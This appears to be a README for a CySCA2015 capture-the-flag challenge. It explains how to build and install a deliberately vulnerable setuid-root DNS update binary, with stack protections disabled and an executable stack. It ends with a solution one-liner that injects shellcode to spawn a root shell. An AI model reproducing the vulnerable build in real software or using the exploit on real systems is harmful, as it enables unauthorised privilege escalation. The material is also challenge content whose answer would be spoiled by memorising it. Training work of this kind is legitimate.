This folder contains files used to deploy on the dns server of the corp challenge in CySCA2015.

# Packages to install
* DNS with bind should be setup in advance.

# Files
* cysca_chall7.c - Source for the DNS Setuid program that is on the server and will allow users to privilege escalate.
* dns-update - Stripped compiled version of dns-update to be used on the server. Solution works against this file.

# Install Instructions
1. Compile cysca_chall7.c with `gcc cysca_chall7.c -m32 -fno-stack-protector -z execstack -no-pie -o dns-update`
2. Strip debug info with `strip dns-update`
3. Copy `dns-update` to `/usr/sbin/dns-update` on the dns server
4. Ensure the dns-update file is owned by `root:root`
5. Add suid permissions and r for users for the binary `chmod 4755 /usr/sbin/dns-update`
6. Add some fake bash history to point users in the direction of the suid binary

# Solution
```bash
./dns-update ecwi.cysca test 1.1.1.`python -c 'print "\x90"*38+"\xeb\x89\x04\x08"+"\x90\x66\x81\xc4\xff\x01\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x30\x04\xdb\xcd\x80"'`
```
